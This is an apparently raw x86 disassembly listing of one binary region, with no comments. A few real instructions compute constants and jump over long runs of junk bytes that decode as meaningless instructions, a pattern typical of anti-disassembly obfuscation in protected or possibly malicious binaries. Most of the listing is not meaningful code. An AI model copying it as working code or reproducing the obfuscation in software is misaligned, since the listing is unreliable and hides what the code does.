  40c8ac:	adc    esp,DWORD PTR [ebx]
  40c8ae:	cmp    ecx,eax
  40c8b0:	jbe    0x40bd54
  40c8b6:	jmp    0x40c978
  40c8bb:	out    0x1a,eax
  40c8bd:	jb     0x40c904
  40c8bf:	jmp    FWORD PTR [ebp-0x9]
  40c8c2:	mov    edx,0xa18e9cc5
  40c8c7:	jno    0x40c8ee
  40c8c9:	call   0xc4ea01
  40c8ce:	add    BYTE PTR [ebp-0x55000000],ah
  40c8d4:	enter  0x81c3,0x5c
  40c8d8:	sub    BYTE PTR [eax+ebp*4],bh
  40c8db:	xchg   ecx,eax
  40c8dc:	out    0x34,al
  40c8de:	nop
  40c8df:	(bad)  
  40c8e0:	cs mov al,0xa8
  40c8e3:	(bad)  
  40c8e4:	pop    ecx
  40c8e5:	jg     0x40c867
  40c8e7:	(bad)  
  40c8e8:	adc    al,BYTE PTR ds:0x651dff1a
  40c8ee:	mov    fs,ebx
  40c8f0:	lahf   
  40c8f1:	ret    0xde2d
  40c8f4:	xchg   DWORD PTR [edi+0x6299e51],edx
  40c8fa:	jns    0x40c899
  40c8fc:	in     eax,dx
  40c8fd:	(bad)  
  40c8ff:	int    0xdd
  40c901:	cmp    al,BYTE PTR [edi]
  40c903:	(bad)  
  40c904:	in     eax,0xfd
  40c906:	inc    ebx
  40c907:	lods   eax,DWORD PTR ds:[esi]
  40c908:	jmp    0xf002:0xf2739870
  40c90f:	push   0x78
  40c911:	mov    ebp,0xd83bf340
  40c916:	pushf  
  40c917:	pop    es
  40c918:	mov    esp,0x8b6de4bd
  40c91d:	scas   eax,DWORD PTR es:[edi]
  40c91e:	add    ebx,edx
  40c920:	mov    ebx,edx
  40c922:	retf   0x6311
  40c925:	sbb    DWORD PTR [ebp+0x609e4212],ebx
  40c92b:	in     eax,0x61
  40c92d:	jo     0x40c914
  40c92f:	cmp    eax,0x136fdf48
  40c934:	cmp    esi,ebp
  40c936:	aaa    
  40c937:	add    eax,0xb0f48330
  40c93c:	sbb    ecx,DWORD PTR [ebx+0x43]
  40c93f:	or     al,0xf5
  40c941:	push   esi
  40c942:	scas   al,BYTE PTR es:[edi]
  40c943:	sbb    al,0xc9
  40c945:	or     al,0xdc
  40c947:	icebp  
  40c948:	jb     0x40c93f
  40c94a:	adc    esi,DWORD PTR [eax+0x14d73032]
  40c950:	pushf  
  40c951:	and    eax,0xf9ecf376
  40c956:	stc    
  40c957:	(bad)  [esi]
  40c959:	imul   ebx,DWORD PTR [eax-0x37f446bf],0x2c
  40c960:	sub    eax,0xc0de2add
  40c965:	sbb    eax,DWORD PTR [eax]
  40c967:	mov    eax,0xce583eb0
  40c96c:	cs dec ebp
  40c96e:	in     eax,dx
  40c96f:	sub    BYTE PTR [ebx],bh
  40c971:	imul   esi,esp,0xffffffd5
  40c974:	add    ebx,DWORD PTR [esi+0x45c79edc]
  40c97a:	int3   
  40c97b:	jecxz  0x40c9f9
  40c97d:	add    BYTE PTR [eax],al
  40c97f:	mov    DWORD PTR [ebp+0xc],0x1b50
  40c986:	mov    DWORD PTR [ebp+0x8],0x3d30
  40c98d:	mov    DWORD PTR [ebp-0x24],0x7e21
  40c994:	mov    DWORD PTR [ebp-0x28],0x6861
  40c99b:	mov    DWORD PTR [ebp-0x2c],0x446c
  40c9a2:	jmp    0x40ca64
  40c9a7:	jg     0x40ca03
  40c9a9:	int    0xe4
  40c9ab:	in     eax,dx
  40c9ac:	idiv   DWORD PTR [edi-0x25]
  40c9af:	aas    
  40c9b0:	movd   mm5,DWORD PTR [esi-0x1c]
  40c9b4:	dec    esi
  40c9b5:	out    0xcd,eax
  40c9b7:	mov    BYTE PTR [eax+eax*1+0xa500],0x0
  40c9bf:	push   eax
  40c9c0:	cmc    
  40c9c1:	pusha  
  40c9c2:	cmp    DWORD PTR [edx],edi
  40c9c4:	add    eax,0x47f2161d
  40c9c9:	loope  0x40c962
  40c9cb:	pop    es
  40c9cc:	ret    
  40c9cd:	mov    eax,ds:0x91ce68a1
  40c9d2:	dec    esp
  40c9d3:	pop    edi
  40c9d4:	sahf   
  40c9d5:	xchg   ecx,eax
  40c9d6:	xchg   ebx,eax
  40c9d7:	mov    dh,0xbf
  40c9d9:	push   eax
  40c9da:	mov    ebx,0x15fe6607
  40c9df:	aad    0xfb
  40c9e1:	push   esi
  40c9e2:	call   0x8300348f
  40c9e7:	scas   eax,DWORD PTR es:[edi]
  40c9e8:	add    eax,0xa4ce9b61
  40c9ed:	bound  ebx,QWORD PTR [eax+eiz*4+0x7a]
  40c9f1:	rcl    BYTE PTR [ebp-0x46],0x46
  40c9f5:	sub    al,0x1a
  40c9f7:	mov    esp,0xb273e6ef
  40c9fc:	fstp   TBYTE PTR ds:0xa2bcdd56
  40ca02:	or     bl,ah
  40ca04:	xor    esi,DWORD PTR ds:0x94c66be4
  40ca0a:	mov    ebx,0x142ced00
  40ca0f:	test   BYTE PTR [esi+0x9],dl
  40ca12:	adc    eax,0x2b743691
  40ca17:	test   eax,0x5fb7d1af
  40ca1c:	dec    ebx
  40ca1d:	ret    
  40ca1e:	and    DWORD PTR cs:[esi-0x1f],edx
  40ca22:	mov    ebx,0x3b671480
  40ca27:	fstp   DWORD PTR [ecx]
  40ca29:	les    esi,FWORD PTR [ebx-0x7b]
  40ca2c:	loopne 0x40ca0c
  40ca2e:	add    DWORD PTR [ebx+0x3e673cc3],ebp
  40ca34:	call   0x9fa1be6b
  40ca39:	jmp    0x40ca34
  40ca3b:	lock pop es
  40ca3d:	or     BYTE PTR [ecx],cl
  40ca3f:	clc    
  40ca40:	ror    BYTE PTR [ebp+edx*1-0x21],0x7
  40ca45:	sbb    BYTE PTR [edi+ebx*2+0x6c],bl
  40ca49:	fsub   QWORD PTR [ecx-0x1868c205]
  40ca4f:	dec    esp
  40ca50:	popf   
  40ca51:	jnp    0x40ca85
  40ca53:	inc    eax
  40ca54:	cmovne ebp,DWORD PTR [esp+eiz*8-0x5d]
  40ca59:	mov    BYTE PTR [edx-0x5fd27fed],dl
  40ca5f:	mov    al,ds:0x10540f9b
  40ca64:	mov    eax,DWORD PTR [ebp+0x8]
  40ca67:	mov    ecx,DWORD PTR [ebp+0xc]
  40ca6a:	xor    eax,0x2991
  40ca6f:	imul   eax,ecx
  40ca72:	jmp    0x40cb34
  40ca77:	arpl   WORD PTR [ecx+edx*8+0x6bddf799],ax
  40ca7e:	(bad)  
  40ca7f:	xchg   ebp,eax
  40ca80:	ins    BYTE PTR es:[edi],dx
  40ca81:	push   eax
  40ca82:	jo     0x40ca6b
  40ca84:	mov    ebx,DWORD PTR [edx+0x856b70]
  40ca8a:	add    BYTE PTR [ebp-0x74000000],ah
  40ca90:	sbb    al,0xd8
  40ca92:	dec    BYTE PTR [eax-0x69]
  40ca95:	out    dx,eax
  40ca96:	popf   
  40ca97:	xor    DWORD PTR [edx],ecx
  40ca99:	adc    BYTE PTR [esi],bl
  40ca9b:	sub    BYTE PTR [edx-0x1],0x1b
  40ca9f:	ja     0x40ca3d
  40caa1:	(bad)  
  40caa2:	jg     0x40ca92
  40caa4:	imul   ebp,ecx,0x3e
  40caa7:	clc    
  40caa8:	push   edx
  40caa9:	stos   BYTE PTR es:[edi],al
  40caaa:	push   ebp
  40caab:	jmp    0xefc8:0xe011494b
  40cab2:	loope  0x40cb2d
  40cab4:	adc    bl,BYTE PTR [edi+edx*4-0x5d]
  40cab8:	arpl   WORD PTR [esi+0x1],dx
  40cabb:	stos   DWORD PTR es:[edi],eax
  40cabc:	ins    BYTE PTR es:[edi],dx
  40cabd:	jle    0x40ca66
  40cabf:	mov    BYTE PTR [edx+0x62c7cdce],bh
  40cac5:	inc    ecx
  40cac6:	pusha  
  40cac7:	mov    ecx,0x6810790b
  40cacc:	fbstp  TBYTE PTR [ebp+0x30fb23b5]
  40cad2:	sbb    al,0xbc
  40cad4:	push   0xc25456c0
  40cad9:	dec    ecx
  40cada:	dec    esi
  40cadb:	xchg   DWORD PTR [ebx-0x66],esp
  40cade:	not    BYTE PTR [edi+0x2464429a]
  40cae4:	out    dx,eax
  40cae5:	popf   
  40cae6:	fnstenv cs:[edx]
  40cae9:	mov    al,0x7d
  40caeb:	jmp    0x40cadc
  40caed:	std    
  40caee:	loop   0x40cb51
  40caf0:	xor    al,0x9a
  40caf2:	pop    edi
  40caf3:	cs cld 
  40caf5:	aam    0xde
  40caf7:	dec    edi
  40caf8:	add    esp,esp
  40cafa:	inc    edi
  40cafb:	mov    esp,0x41eb49d3
  40cb00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb01:	inc    ebp
  40cb02:	adc    DWORD PTR [eax+0x78951289],ebx
  40cb08:	cli    
  40cb09:	mov    eax,DWORD PTR [ebp-0x4358c7fc]
  40cb0f:	cld    
  40cb10:	out    dx,al
  40cb11:	repnz add ecx,DWORD PTR [eax]
  40cb14:	leave  
  40cb15:	in     eax,dx
  40cb16:	or     DWORD PTR [eax+eax*1-0x23a62d3d],ecx
  40cb1d:	fiadd  DWORD PTR [esi-0xd]
  40cb20:	call   0x9f07f672
  40cb25:	xchg   esi,eax
  40cb26:	cmp    esp,esp
  40cb28:	inc    eax
  40cb29:	in     eax,dx
  40cb2a:	inc    edi
  40cb2b:	add    ch,cl
  40cb2d:	mov    DWORD PTR [ebp+edx*2-0x3d],ecx
  40cb31:	jge    0x40cb38
  40cb33:	xchg   edx,eax
  40cb34:	mov    ecx,DWORD PTR [ebp-0x34]
  40cb37:	jmp    0x40cbf9
  40cb3c:	xchg   esi,eax
  40cb3d:	test   eax,0xd77f4778
  40cb42:	mov    edi,0xd0690af9
  40cb47:	add    bl,BYTE PTR [esi+0x7c]
  40cb4a:	jae    0x40cbbc
  40cb4c:	adc    BYTE PTR [esi+0xa50000],al
  40cb52:	add    BYTE PTR [eax],al
  40cb54:	inc    esi
  40cb55:	daa    
  40cb56:	pop    si
  40cb58:	leave  
  40cb59:	cmp    DWORD PTR [ebx],esi
  40cb5b:	lods   eax,DWORD PTR ds:[esi]
  40cb5c:	idiv   BYTE PTR [edx-0x16]
  40cb5f:	inc    eax
  40cb60:	into   
  40cb61:	(bad)  
  40cb62:	js     0x40cb1a
  40cb64:	jecxz  0x40cb06
  40cb66:	sbb    ebp,esp
  40cb68:	repnz xchg ebx,edx
  40cb6b:	fwait
  40cb6c:	jg     0x40cb23
  40cb6e:	cwde   
  40cb6f:	lock dec eax
  40cb71:	test   al,0xf4
  40cb73:	adc    al,0xa3
  40cb75:	sti    
  40cb76:	xchg   edx,eax
  40cb77:	inc    edx
  40cb78:	pop    ebp
  40cb79:	adc    eax,0xc8ae0ce4
  40cb7e:	add    edx,ebp
  40cb80:	sti    
  40cb81:	sub    eax,0x861af1b5
  40cb86:	mov    dl,BYTE PTR [ecx]
  40cb88:	xor    bl,BYTE PTR [ebp+0x37]
  40cb8b:	xchg   dh,cl
  40cb8d:	das    
  40cb8e:	dec    edx
  40cb8f:	sbb    al,0xaa
  40cb91:	add    bh,0xb5
  40cb94:	ja     0x40cba6
  40cb96:	ret    0x2397
  40cb99:	(bad)  
  40cb9a:	mov    WORD PTR [ecx+ebx*2-0x29c31fb4],es
  40cba1:	loope  0x40cb75
  40cba3:	jmp    0xb97b4ea4
  40cba8:	adc    DWORD PTR [ebp+0x26],eax
  40cbab:	sbb    ebp,DWORD PTR [ebp-0x3e]
  40cbae:	mov    edx,0x680b191b
  40cbb3:	sbb    eax,0x2bc18df7
  40cbb8:	push   esp
  40cbb9:	mov    al,0x4c
  40cbbb:	mov    eax,0x560ecdcb
  40cbc0:	shl    BYTE PTR [eax+0x47bc8],0xbf
  40cbc7:	cmp    bh,BYTE PTR [esi]
  40cbc9:	jnp    0x40cb54
  40cbcb:	xchg   bl,bl
  40cbcd:	outs   dx,DWORD PTR ds:[esi]
  40cbce:	lds    esp,FWORD PTR [edi]
  40cbd0:	dec    esp
  40cbd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbd2:	hlt    
  40cbd3:	push   esi
  40cbd4:	xor    eax,0x2f2de336
  40cbd9:	ss js  0x40cb9d
  40cbdc:	mov    dl,0x6a
  40cbde:	test   DWORD PTR [eax-0x3e],0xd341c8db
  40cbe5:	pop    ebx
  40cbe6:	add    esp,DWORD PTR [edx+0x4d]
  40cbe9:	shl    DWORD PTR [edi-0x7666c68a],1
  40cbef:	(bad)
  40cbf4:	ins    DWORD PTR es:[edi],dx
  40cbf5:	jnp    0x40cc31
  40cbf7:	lea    edi,[edx+0x630dc10b]
  40cbfd:	pusha  
  40cbfe:	add    BYTE PTR [eax],al
  40cc00:	jmp    0x40ccc2
  40cc05:	jecxz  0x40cb8f
  40cc07:	mov    eax,ds:0xf73deb34
  40cc0c:	fcomip st,st(6)
  40cc0e:	and    BYTE PTR [edi-0x33],0x8d
  40cc12:	mov    bh,0x93
  40cc14:	sbb    al,0xb5
  40cc16:	xchg   BYTE PTR [eax],al
  40cc18:	add    BYTE PTR [ebp+0x4a000000],ah
  40cc1e:	xor    eax,0x43f1a993
  40cc23:	stos   BYTE PTR es:[edi],al
  40cc24:	push   edi
  40cc25:	jo     0x40cc6b
  40cc27:	adc    al,0xed
  40cc29:	pusha  
  40cc2a:	mov    bl,0x3f
  40cc2c:	xchg   edx,eax
  40cc2d:	and    esi,DWORD PTR [ebp-0x65]
  40cc30:	add    ecx,0x258f1d2b
  40cc36:	loopne 0x40cbe1
  40cc38:	mov    ds:0x85859561,al
  40cc3d:	mov    ds:0xeff0c967,al
  40cc42:	mov    dh,0x1d
  40cc44:	gs mov edx,0xba98708a
  40cc4a:	adc    ebp,eax
  40cc4c:	cwde   
  40cc4d:	in     eax,0x63
  40cc4f:	add    eax,0x40a4f64b
  40cc54:	(bad)  [eax+edi*4+0x17e7f4fc]
  40cc5b:	aam    0xe9
  40cc5d:	fidivr DWORD PTR [ecx-0x2dece73a]
  40cc63:	call   0x1cceef30
  40cc68:	ss jns 0x40cc53
  40cc6b:	out    0x30,al
  40cc6d:	ficomp DWORD PTR [esi+0x12]
  40cc70:	call   0xb0ed:0x88816afd
  40cc77:	push   cs
  40cc78:	push   eax
  40cc79:	inc    edi
  40cc7a:	mov    edi,0xdfa43315
  40cc7f:	iret   
  40cc80:	leave  
  40cc81:	daa    
  40cc82:	in     al,dx
  40cc83:	sbb    al,0xf5
  40cc85:	sub    al,0x28
  40cc87:	shl    bl,0xf7
  40cc8a:	int3   
  40cc8b:	xchg   DWORD PTR [ecx],esi
  40cc8d:	(bad)  
  40cc8e:	mov    dl,0x23
  40cc90:	xchg   edi,eax
  40cc91:	retf   0x8ae8
  40cc94:	not    DWORD PTR [ecx]
  40cc96:	jne    0x40cc4a
  40cc98:	loope  0x40cc2a
  40cc9a:	inc    edx
  40cc9b:	(bad)  
  40cc9c:	int    0x19
  40cc9e:	sub    al,0xda
  40cca1:	cdq    
  40cca2:	xchg   dx,ax
  40cca4:	out    dx,eax
  40cca5:	jp     0x40cca4
  40cca7:	mov    WORD PTR [ebx-0x1fbc399],?
  40ccad:	pop    eax
  40ccae:	sar    DWORD PTR [ebx],1
  40ccb0:	call   0x9d88:0x24188ab6
  40ccb7:	pop    DWORD PTR [edi+0x70]
  40ccba:	and    al,BYTE PTR [ecx]
  40ccbc:	cmp    bh,BYTE PTR [esp+eax*4-0x46ebb079]
  40ccc3:	push   esp
  40ccc4:	mov    edi,0xc82b0233
  40ccc9:	jmp    0x40cd8b
  40ccce:	cwde   
  40cccf:	xchg   edx,eax
  40ccd0:	jb     0x40ccfe
  40ccd2:	jp     0x40ccc0
  40ccd4:	fidiv  WORD PTR [esi+0xdd5e468]
  40ccda:	shr    BYTE PTR [esi+0xc],cl
  40ccdd:	or     eax,0x875a
  40cce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cce3:	add    BYTE PTR [eax],al
  40cce5:	add    BYTE PTR [esi+edi*8],al
  40cce8:	out    0xe9,eax
  40ccea:	add    eax,0x2bd9c853
  40ccef:	push   0x7c
  40ccf1:	js     0x40cd4a
  40ccf3:	xchg   edi,eax
  40ccf4:	dec    eax
  40ccf5:	pop    ss
  40ccf6:	outs   dx,DWORD PTR ds:[esi]
  40ccf7:	imul   esi,edi,0xffffffb8
  40ccfa:	(bad)  
  40ccfb:	cmp    bl,BYTE PTR [eax]
  40ccfd:	or     ecx,DWORD PTR [ebx-0x11815fea]
  40cd03:	push   esp
  40cd04:	inc    edi
  40cd05:	adc    dl,BYTE PTR [ecx]
  40cd07:	and    DWORD PTR [edx-0x6235773c],eax
  40cd0d:	ss mov cl,0x8e
  40cd10:	xor    eax,0x3b67a72
  40cd15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd16:	sbb    DWORD PTR [eax+ebx*4],esi
  40cd19:	or     al,0x29
  40cd1b:	js     0x40cd4f
  40cd1d:	mov    bh,BYTE PTR [edi]
  40cd1f:	jne    0x40ccf5
  40cd21:	push   edx
  40cd22:	fwait
  40cd23:	inc    ebp
  40cd24:	mov    WORD PTR [edi-0x60622929],?
  40cd2a:	shl    BYTE PTR [ebx],cl
  40cd2c:	or     DWORD PTR [ebp-0x4f9339f5],edx
  40cd32:	std    
  40cd33:	pop    edx
  40cd34:	(bad)  
  40cd35:	in     eax,dx
  40cd36:	out    0xa5,al
  40cd38:	retf   
  40cd39:	push   esi
  40cd3a:	jg     0x40ccc1
  40cd3c:	sbb    eax,0xb833bcc6
  40cd41:	call   0xbea7:0x229e703
  40cd48:	mov    edx,0x4de80111
  40cd4d:	sbb    BYTE PTR [ebx-0xd],ch
  40cd50:	retf   0x4c7c
  40cd53:	lods   al,BYTE PTR ds:[esi]
  40cd54:	inc    edi
  40cd55:	dec    ebx
  40cd56:	mov    esi,0xc0861d49
  40cd5b:	data16 cld 
  40cd5d:	inc    esp
  40cd5e:	stos   DWORD PTR es:[edi],eax
  40cd5f:	push   cs
  40cd60:	mov    cl,0xc9
  40cd62:	rcr    DWORD PTR [ebx],cl
  40cd64:	gs mov dl,0xa
  40cd67:	xor    BYTE PTR [eax-0x340b8b0c],0x2b
  40cd6e:	stc    
  40cd6f:	gs or  ch,dh
  40cd72:	xor    DWORD PTR [eax+0x3d],0xffffffd7
  40cd76:	call   0x3c7:0xc94c6216
  40cd7d:	inc    ebx
  40cd7e:	xchg   esi,eax
  40cd7f:	leave  
  40cd80:	dec    esi
  40cd81:	lea    edx,[edx*8-0x27ef1e65]
  40cd88:	cs ror edi,1
  40cd8b:	mov    DWORD PTR [ebp+0x8],0xd95
  40cd92:	mov    DWORD PTR [ebp-0x30],0x1c92
  40cd99:	mov    DWORD PTR [ebp-0x34],0x7b8c
  40cda0:	mov    DWORD PTR [ebp+0xc],0x60d
  40cda7:	jmp    0x40ce69
  40cdac:	xor    al,0x15
  40cdae:	or     ch,BYTE PTR [eax-0x624940d5]
  40cdb4:	(bad)  [edi-0x13f5cc9b]
  40cdba:	jnp    0x40cdfb
  40cdbc:	inc    DWORD PTR [edi+0xa50000]
  40cdc2:	add    BYTE PTR [eax],al
  40cdc4:	sti    
  40cdc5:	xor    ah,0xbe
  40cdc8:	jne    0x40ce47
  40cdca:	ja     0x40cdb5
  40cdcc:	cmp    eax,DWORD PTR [edi]
  40cdce:	hlt    
  40cdcf:	pop    ecx
  40cdd0:	cwde   
  40cdd1:	sub    DWORD PTR [edx-0x44867a11],eax
  40cdd7:	push   esi
  40cdd8:	ficomp DWORD PTR [edi]
  40cdda:	xchg   ebx,eax
  40cddb:	push   ss
  40cddc:	xor    bl,0xe3
  40cddf:	adc    al,ah
  40cde1:	mov    ds:0xd9d65e8f,eax
  40cde6:	xor    ah,dl
  40cde8:	dec    eax
  40cde9:	xlat   BYTE PTR ds:[ebx]
  40cdea:	dec    eax
  40cdeb:	push   ecx
  40cdec:	mov    ecx,0x92106609
  40cdf1:	arpl   WORD PTR [edi+0x405c8882],bp
  40cdf7:	jne    0x40cdc5
  40cdf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdfa:	pop    ecx
  40cdfb:	push   0x3c
  40cdfd:	pop    esi
  40cdfe:	test   BYTE PTR [eax-0x21],ch
  40ce01:	outs   dx,BYTE PTR ds:[esi]
  40ce02:	jo     0x40ce40
  40ce04:	clc    
  40ce05:	pusha  
  40ce06:	push   ebp
  40ce07:	xor    al,0xb5
  40ce09:	dec    esi
  40ce0a:	dec    edx
  40ce0b:	das    
  40ce0c:	xor    DWORD PTR [edx],eax
  40ce0e:	daa    
  40ce0f:	mov    bl,BYTE PTR [esp+esi*8+0x37]
  40ce13:	aam    0x12
  40ce15:	and    eax,0x7513b417
  40ce1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce1b:	cmp    cl,BYTE PTR [edx-0x3c]
  40ce1e:	push   edx
  40ce1f:	fdiv   st(4),st
  40ce21:	push   ecx
  40ce22:	sub    ebx,DWORD PTR ds:0x760b67d
  40ce28:	test   BYTE PTR [edx-0x2f70b374],bl
  40ce2e:	and    al,0xe6
  40ce30:	mov    eax,ds:0x193c51fa
  40ce35:	mov    cl,0x5f
  40ce37:	add    ch,BYTE PTR [edi]
  40ce39:	ret    
  40ce3a:	cmp    DWORD PTR [esi],edi
  40ce3c:	loope  0x40cdd8
  40ce3e:	iret   
  40ce3f:	retf   
  40ce40:	jecxz  0x40ce97
  40ce42:	inc    edx
  40ce43:	inc    esp
  40ce44:	xchg   DWORD PTR es:[eax-0x2b],esi
  40ce48:	jge    0x40ce37
  40ce4a:	and    ebx,DWORD PTR [ecx+0x49e6e47a]
  40ce50:	xchg   edi,esi
  40ce52:	sub    bh,dl
  40ce54:	mov    esp,0x1eb2f303
  40ce59:	sbb    esi,esp
  40ce5b:	int    0x28
  40ce5d:	sub    dh,BYTE PTR [esi-0x73]
  40ce60:	ins    BYTE PTR es:[edi],dx
  40ce61:	mov    ebx,0x1d7030c5
  40ce66:	repnz int 0x36
  40ce69:	mov    eax,DWORD PTR [ebp+0x8]
  40ce6c:	xor    eax,0x3cc5
  40ce71:	add    eax,0x6a79
  40ce76:	xor    eax,0xdaa8
  40ce7b:	jmp    0x40cf3d
  40ce80:	xchg   edi,eax
  40ce81:	inc    edi
  40ce82:	or     eax,0xb77bdd39
  40ce87:	out    dx,eax
  40ce88:	int3   
  40ce89:	mov    al,0x45
  40ce8b:	in     al,0x61
  40ce8d:	or     eax,0x88a4334c
  40ce92:	add    BYTE PTR [eax],al
  40ce94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce95:	add    BYTE PTR [eax],al
  40ce97:	add    BYTE PTR [ecx],ah
  40ce99:	add    ebp,DWORD PTR [ecx-0x72]
  40ce9c:	push   0x75fa3256
  40cea1:	pop    ecx
  40cea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cea3:	ds jb  0x40ce90
  40cea6:	arpl   cx,ax
  40cea8:	mov    esp,0xc75855e4
  40cead:	mov    al,ds:0x6ca4f95a
  40ceb2:	sub    BYTE PTR [edi+0x654f376],0xed
  40ceb9:	cdq    
  40ceba:	add    ah,dl
  40cebc:	out    dx,al
  40cebd:	pop    eax
  40cebe:	mov    bh,0xa4
  40cec0:	jae    0x40cf1b
  40cec2:	jle    0x40ced9
  40cec4:	xchg   esp,eax
  40cec5:	dec    ebx
  40cec6:	adc    edi,DWORD PTR [eax+0xa]
  40cec9:	jecxz  0x40cee7
  40cecb:	ja     0x40cefc
  40cecd:	sbb    ebp,DWORD PTR [ebx]
  40cecf:	aam    0xf9
  40ced1:	pop    ebp
  40ced2:	cmp    esp,DWORD PTR [ebx]
  40ced4:	or     al,0x63
  40ced6:	lods   al,BYTE PTR ds:[esi]
  40ced7:	xchg   esp,eax
  40ced8:	jns    0x40cf0e
  40ceda:	pop    es
  40cedb:	(bad)  
  40cedc:	fs inc ebp
  40cede:	inc    ebp
  40cedf:	xchg   ecx,eax
  40cee0:	jo     0x40cee8
  40cee2:	out    dx,al
  40cee3:	adc    eax,0x6166564b
  40cee8:	inc    esp
  40cee9:	mov    esp,0x30f75039
  40ceee:	in     al,0xe0
  40cef0:	push   ebp
  40cef1:	scas   eax,DWORD PTR es:[edi]
  40cef2:	jns    0x40cf0d
  40cef4:	mov    ch,0x93
  40cef6:	adc    eax,0x2c45667c
  40cefb:	cdq    
  40cefc:	jbe    0x40cedd
  40cefe:	fs sti 
  40cf00:	jbe    0x40cf28
  40cf02:	push   ss
  40cf03:	push   esi
  40cf04:	or     eax,0xe0b0906d
  40cf09:	push   0xf33d28e2
  40cf0e:	or     al,0x52
  40cf10:	bound  edx,QWORD PTR [edi-0x4a]
  40cf13:	mov    edx,0x8197004
  40cf18:	sbb    BYTE PTR [esi],bh
  40cf1a:	imul   edx,DWORD PTR [ebp+0x6e1708b7],0x23b43edc
  40cf24:	(bad)  
  40cf25:	and    DWORD PTR [eax+0x5f07b14],0xffffffa1
  40cf2c:	mov    ds:0x24fd6204,eax
  40cf31:	imul   ebp,DWORD PTR ds:0x52fb7da6,0x3a
  40cf38:	inc    esi
  40cf39:	ret    0x1fbc
  40cf3c:	cli    
  40cf3d:	mov    edx,ecx
  40cf3f:	sub    edx,eax
  40cf41:	jmp    0x40d003
  40cf46:	mov    ah,0x5d
  40cf48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf49:	or     al,0xef
  40cf4b:	(bad)  
  40cf4c:	mov    esi,0x9cf67cfd
  40cf51:	(bad)  
  40cf53:	jbe    0x40cf0e
  40cf55:	je     0x40cfa0
  40cf57:	mov    DWORD PTR [eax],eax
  40cf59:	add    BYTE PTR [ebp+0x3c000000],ah
  40cf5f:	shr    ebx,1
  40cf61:	xor    al,0x98
  40cf63:	inc    ebp
  40cf64:	test   eax,0x9f9a3d07
  40cf69:	add    al,0x30
  40cf6b:	aad    0xa4
  40cf6d:	adc    ebx,esp
  40cf6f:	mov    esp,0xe88058d7
  40cf74:	xchg   esi,eax
  40cf75:	mov    ecx,0x567b347a
  40cf7a:	xor    al,0xf9
  40cf7c:	sub    dh,BYTE PTR [edi]
  40cf7e:	xchg   edi,eax
  40cf7f:	sub    dh,BYTE PTR [eax]
  40cf81:	inc    ah
  40cf83:	cli    
  40cf84:	jge    0x40cfea
  40cf86:	fisub  WORD PTR [ecx]
  40cf88:	add    eax,0x27eb57a8
  40cf8d:	test   al,0x8
  40cf8f:	or     BYTE PTR [edx+0x1],bh
  40cf92:	jl     0x40cf24
  40cf94:	or     BYTE PTR [esi+ecx*1],cl
  40cf97:	add    DWORD PTR [eax],edi
  40cf99:	mov    ds:0xf5e99467,al
  40cf9e:	cmp    ecx,DWORD PTR [edi]
  40cfa0:	xchg   ebx,eax
  40cfa1:	stc    
  40cfa2:	mov    ah,0x4e
  40cfa4:	out    dx,al
  40cfa5:	xor    al,0x4e
  40cfa7:	sbb    eax,0xb14b049f
  40cfac:	aaa    
  40cfad:	in     eax,0x74
  40cfaf:	pop    eax
  40cfb0:	mov    BYTE PTR [edx-0x14],cl
  40cfb3:	mov    al,ds:0x62cdf9d6
  40cfb8:	jne    0x40d029
  40cfba:	add    al,0xf
  40cfbc:	xchg   esp,eax
  40cfbd:	out    0xbd,eax
  40cfbf:	popa   
  40cfc0:	jno    0x40d01e
  40cfc2:	sbb    dh,ah
  40cfc4:	mov    eax,ds:0x4922d0a2
  40cfc9:	xor    edx,esi
  40cfcb:	pop    edx
  40cfcc:	sbb    bl,BYTE PTR [ebp-0x40]
  40cfcf:	sbb    al,0x82
  40cfd1:	mov    cl,0x5a
  40cfd3:	mov    edx,0x502f8449
  40cfd8:	adc    al,0xbc
  40cfda:	dec    ebx
  40cfdb:	fwait
  40cfdc:	stos   BYTE PTR es:[edi],al
  40cfdd:	pop    ecx
  40cfde:	sbb    ah,BYTE PTR [edx-0x5483d4b3]
  40cfe4:	aas    
  40cfe5:	addr16 fxch st(1)
  40cfe8:	ret    0xe48c
  40cfeb:	addr16 sti 
  40cfed:	cli    
  40cfee:	mov    ds,WORD PTR ss:[eax+eax*4-0x232badb9]
  40cff6:	pop    ebx
  40cff7:	and    BYTE PTR [edi],bl
  40cff9:	mov    esi,0xf81b7eb7
  40cffe:	mov    esi,0x4dbf3052
  40d003:	mov    eax,DWORD PTR [ebp+0xc]
  40d006:	jmp    0x40d0c8
  40d00b:	test   ecx,0xbfff83fd
  40d011:	push   ebp
  40d013:	mov    esi,DWORD PTR [edx]
  40d015:	mov    esp,0xfe50831c
  40d01a:	mov    eax,ds:0x89ee
  40d01f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d020:	add    BYTE PTR [eax],al
  40d022:	add    BYTE PTR [ebx+0x6f],dh
  40d025:	or     al,BYTE PTR [esi-0x35bde03c]
  40d02b:	xor    eax,ebp
  40d02d:	push   ebp
  40d02e:	aad    0xd6
  40d030:	sub    BYTE PTR [edi+0x44],dh
  40d033:	xor    eax,0x1ece9e38
  40d038:	inc    edi
  40d039:	and    eax,0xadfaa9c9
  40d03e:	or     eax,DWORD PTR [ecx+0x6e1ae7fc]
  40d044:	xor    al,0x78
  40d046:	inc    esi
  40d047:	or     BYTE PTR [esi+0x3a],dh
  40d04a:	xchg   ebx,eax
  40d04b:	loopne 0x40d00a
  40d04d:	and    BYTE PTR [ecx],cl
  40d04f:	mov    dl,0xb9
  40d051:	jmp    0x2873:0x171d322
  40d058:	rcr    BYTE PTR [edi+0x61d4f881],1
  40d05e:	sub    al,BYTE PTR [esp+edi*8-0xf]
  40d062:	pop    ebx
  40d063:	xchg   BYTE PTR [ebp+0x4130bfd],al
  40d069:	jl     0x40d03e
  40d06b:	mov    ecx,0x325ffb8d
  40d070:	pop    ds
  40d071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d072:	pop    ss
